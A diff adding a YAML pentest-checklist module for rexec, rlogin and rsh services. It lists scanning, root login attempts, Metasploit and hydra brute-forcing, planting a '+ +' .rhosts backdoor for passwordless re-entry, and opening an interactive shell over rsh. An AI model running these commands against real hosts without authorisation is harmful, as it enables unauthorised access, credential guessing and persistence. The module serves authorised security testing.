@@ -1,0 +1,64 @@
+module: rservices
+name: r-services - rexec / rlogin / rsh (512 / 513 / 514)
+inputs: [USERS, PASS, OUT]
+
+sections:
+
+  - id: initial
+    name: Initial Access & Detection
+    steps:
+      - id: version
+        text: Confirm live / identify which r-service
+        commands: |
+          nmap -p512,513,514 -sV -sC $IP
+      - id: clients
+        text: Ensure legacy clients are installed
+        commands: |
+          which rlogin rsh rexec || sudo apt install -y rsh-client
+
+  - id: enum
+    name: Trust & Config Notes
+    steps:
+      - id: trust
+        text: Note trust files that grant passwordless access
+        manual: true
+        commands: |
+          # ~/.rhosts and /etc/hosts.equiv with "+ +" = anyone trusted
+          # look for these once you have any file read on the host
+
+  - id: creds
+    name: Access & Credentials
+    authorized: true
+    steps:
+      - id: rlogin_root
+        text: rlogin - try trusted / root login (513)
+        commands: |
+          rlogin -l root $IP
+          rlogin -l $USER $IP
+      - id: rsh
+        text: rsh - run a command / get a shell (514)
+        commands: |
+          rsh $IP -l root id
+          rsh -l $USER $IP whoami
+      - id: rexec
+        text: rexec - authenticated remote exec (512)
+        commands: |
+          msfconsole -qx "use auxiliary/scanner/rservices/rexec_login; set RHOSTS $IP; set USERPASS_FILE creds.txt; run; exit"
+      - id: brute
+        text: Brute-force rlogin / rsh
+        commands: |
+          hydra -L $USERLIST -P $PASSLIST rlogin://$IP
+          msfconsole -qx "use auxiliary/scanner/rservices/rlogin_login; set RHOSTS $IP; set USER_FILE $USERLIST; set PASS_FILE $PASSLIST; run; exit"
+
+  - id: exploit
+    name: Post-Access
+    steps:
+      - id: plant_rhosts
+        text: Plant a .rhosts for passwordless re-entry (if writable home)
+        manual: true
+        commands: |
+          # echo "+ +" > ~/.rhosts   (then rlogin/rsh with no password)
+      - id: shell
+        text: Upgrade to an interactive shell
+        commands: |
+          rsh -l root $IP "bash -i"
